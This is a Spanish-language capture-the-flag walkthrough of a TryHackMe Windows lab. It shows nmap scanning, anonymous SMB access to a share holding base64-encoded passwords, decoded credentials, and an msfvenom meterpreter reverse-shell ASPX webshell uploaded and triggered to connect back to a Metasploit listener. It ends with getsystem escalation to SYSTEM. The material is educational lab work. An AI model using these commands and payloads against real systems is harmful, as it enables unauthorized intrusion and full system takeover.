### **Tutorial: Explotación de la máquina Revelant – TryHackMe**

Este laboratorio muestra el proceso de reconocimiento, enumeración, acceso inicial y escalada de privilegios en una máquina vulnerable del laboratorio de TryHackMe.

## 1. Conexión a la VPN de TryHackMe

Para acceder a las máquinas del laboratorio es necesario conectarse previamente a la VPN de TryHackMe. Esto crea un túnel seguro entre la máquina Kali Linux y la red privada donde se encuentran los sistemas vulnerables.

### 1.1 Conexión mediante OpenVPN

Desde la terminal de Kali se ejecuta el siguiente comando utilizando el archivo .ovpn descargado desde la plataforma:

```bash
sudo openvpn /home/nerea/Descargas/eu-central-1-nereacandonramos-regular.ovpn
```

Si la conexión se establece correctamente aparecerá el siguiente mensaje:

```bash
Initialization Sequence Completed
```

Esto indica que la conexión VPN se ha realizado correctamente.
Si vemos que no funciona, probar otro archivo de configuración hasta que se vea conectado en vez de central, poner west..


### 1.2 Verificación de la conexión

Para comprobar que la conexión está activa se ejecuta:

```bash
ip a
```

En la salida aparecerá una interfaz de red llamada:

```bash
tun0
```

Esta interfaz corresponde a la conexión con la red privada de TryHackMe.
Esta máquina no responde a ping, tarda en arrancar.

## 2. Escaneo de puertos con Nmap

El siguiente paso consiste en identificar los servicios expuestos en la máquina objetivo mediante un escaneo completo de puertos.

Dado que la máquina no responde a peticiones ICMP (ping), se utiliza el parámetro -Pn para tratar el host como activo.

```bash
nmap -p- -sV -sC -Pn 10.129.150.203
```

![nmap](Maquinas_de_Windows/Revelant/imagenes/nmap.png)

Explicación del comando
- -p- → Escanea los 65535 puertos
- -sV → Detecta la versión de los servicios
- -sC → Ejecuta scripts básicos de enumeración
- -Pn → Omite el ping y asume que el host está activo

### 2.1 Resultados del escaneo

Los resultados obtenidos fueron los siguientes:

```bash
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

## 3. Enumeración del servicio SMB

Se enumeran los recursos compartidos disponibles en el servidor:

```bash
smbclient -L //10.129.150.203 -N
```

Se identifica un recurso compartido interesante:

```bash
nt4wrksv
```
Este recurso no es un share estándar del sistema, lo que sugiere que puede contener información relevante o ser utilizado por la aplicación web.

```bash
get passwords.txt
```
luego de hacer eso hacemos exit.

![get](Maquinas_de_Windows/Revelant/imagenes/smb2.png)

Después de salirnos miramos el archivo, por eso es importante hacer el get.

```bash
cat passwords.txt
```

Contenido:

```bash
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

![cat](Maquinas_de_Windows/Revelant/imagenes/cat.png)

Se observa que las credenciales están codificadas en Base64, por lo que se procede a decodificarlas:

```bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
echo "QmlsbCAt IEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
```

Resultado:

```bash
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n4206969!$$$
```
![echo](Maquinas_de_Windows/Revelant/imagenes/echo.png)

Esto revela dos posibles usuarios del sistema junto con sus contraseñas.

## 4. Exploit con MsfVenom y reverse shell con Metaexploit
Tras obtener credenciales válidas y acceso al recurso compartido SMB, el siguiente objetivo es conseguir ejecución remota de código en la máquina víctima.

### 4.1 Generación de la reverse shell con msfvenom

Se genera una webshell en formato ASPX compatible con servidores IIS:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.142.53 LPORT=8910 -f aspx -o shell.aspx
```

![venom](Maquinas_de_Windows/Revelant/imagenes/msfvenom.png)

Explicación:

- -p windows/x64/meterpreter_reverse_tcp → Payload de Meterpreter para Windows
- LHOST → IP de la máquina atacante
- LPORT → Puerto de escucha
- -f aspx → Formato compatible con IIS
- -o shell.aspx → Archivo de salida


### 4.2 Subida de la webshell al servidor

Se accede nuevamente al recurso compartido SMB:

```bash
smbclient //10.129.150.203/nt4wrksv -U Bob
```

Se introduce la contraseña obtenida previamente:

```bash
!P@$$W0rD!123
```

Una vez dentro, se sube la webshell:

```bash
put shell.aspx
```

Se verifica que el archivo se ha subido correctamente:

```bash
ls
```
![cliente](Maquinas_de_Windows/Revelant/imagenes/smbcliente.png)

### 4.3 Configuración del listener en Metasploit

Antes de ejecutar la shell, se prepara el listener para recibir la conexión:

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 192.168.142.53
set LPORT 8910
run
```

![msfconsole](Maquinas_de_Windows/Revelant/imagenes/msfconsole.png)

## 4.4 Ejecución de la webshell

Se accede desde el navegador a la siguiente URL:

```bash
curl http://10.129.150.203/nt4wrksv/shell.aspx
```

Esto provoca que la máquina víctima ejecute el payload y establezca una conexión inversa.


### 4.5 Obtención de la sesión Meterpreter

En la consola de Metasploit se recibe la conexión:

```bash
Meterpreter session opened
```

Esto indica que se ha obtenido acceso remoto al sistema.


## 5. Escalada de privilegios a SYSTEM

Una vez dentro del sistema, el objetivo es obtener el máximo nivel de privilegios.

### 5.1 Verificación de privilegios actuales

```bash
getuid
```
En muchos casos iniciales se obtiene un usuario con privilegios limitados.


### 5.2 Escalada automática con getsystem

Se ejecuta:

```bash
getsystem
```

Si la técnica tiene éxito, se obtendrán privilegios elevados.

Ahora volvemos hacer el comando para ver si somos system.

```bash
getuid
```

![getuid](Maquinas_de_Windows/Revelant/imagenes/system.png)

Resultado esperado:

```bash
NT AUTHORITY\SYSTEM
```
Esto confirma que se ha logrado el control total del sistema.